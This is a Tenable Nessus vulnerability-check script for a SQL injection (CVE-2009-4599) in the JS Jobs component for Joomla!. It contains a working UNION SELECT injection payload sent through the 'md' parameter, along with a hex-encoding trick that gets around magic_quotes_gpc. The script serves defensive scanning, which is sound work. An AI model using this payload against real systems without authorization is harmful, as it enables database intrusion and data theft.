#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(43850);
  script_version("$Revision: 1.16 $");
  script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_cve_id("CVE-2009-4599");
  script_bugtraq_id(37281);
  script_osvdb_id(61673);
  script_xref(name:"EDB-ID", value:"10366");

  script_name(english:"JS Jobs Component for Joomla! 'md' Parameter SQLi");
  script_summary(english:"Exploits a SQL Injection Vulnerability.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of the JS Jobs component for Joomla! running on the remote
host is affected by a SQL injection vulnerability due to improper
sanitization of user-supplied input to the 'md' parameter before using
it to construct database queries. Regardless of the PHP
'magic_quotes_gpc' setting, an unauthenticated, remote attacker can
exploit this issue to manipulate database queries, resulting in
disclosure of sensitive information, modification of data, or other
attacks against the underlying database.");
  # https://packetstormsecurity.com/files/83659/Joomla-JS-Jobs-1.0.5.6-SQL-Injection.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?8dd86f4a");
  script_set_attribute(attribute:"solution", value:
"Upgrade to JS Jobs version 1.0.5.7 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:U/RC:X");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(89);

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/12/10");
  script_set_attribute(attribute:"patch_publication_date", value:"2009/12/18"); # date on models/jsjobs.php in 1.0.5.7
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/01/11");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2017 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Joomla!", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "Joomla!";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url =  build_url(port:port, qs:dir);

# Verify component is installed
plugin = "JS Jobs";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  regexes = make_list();
  regexes[0] = make_list('.jppagetitle', '.jobstatusmsg');
  checks["/components/com_jsjobs/css/jsjobs01.css"]=regexes;

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );

}
if (!installed) audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " component");

# This function converts a string to a concatenation of hex chars so we
# can pass in strings without worrying about PHP's magic_quotes_gpc.
function hexify(str)
{
  local_var hstr, i, l;

  l = strlen(str);
  if (l == 0) return "";

  hstr = "concat(";
  for (i=0; i<l; i++)
    hstr += hex(ord(str[i])) + ",";
  hstr[strlen(hstr)-1] = ")";

  return hstr;
}
test_script = SCRIPT_NAME - ".nasl";

# Try to exploit the issue to manipulate a company's information.
exploit = "-" + rand() % 1000 + " UNION SELECT 1,2,3," + hexify(str:test_script) + ",5,6,7,8,9,10,11,12,13,14,15,@@version,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41";

url = "/index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=view_company&vm=NESSUS&md=" + str_replace(find:" ", replace:"%20", string:exploit);

res = http_send_recv3(port:port, method:"GET", item:dir+url, exit_on_fail:TRUE);

# There's a problem if we can influence the company information.
if (
  'Company Information\t</td>' >< res[2] &&
  '<strong>'+test_script+'</strong></font>' >< res[2]
)
{
  output = strstr(res[2], 'Contact Name');
  if (empty_or_null(output)) output = res[2];

  security_report_v4(
    port        : port,
    severity    : SECURITY_HOLE,
    line_limit  : 10,
    sqli        : TRUE,
    generic     : TRUE,
    request     : make_list(install_url+url),
    output      : chomp(output)
  );
  exit(0);
}
else
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " component");
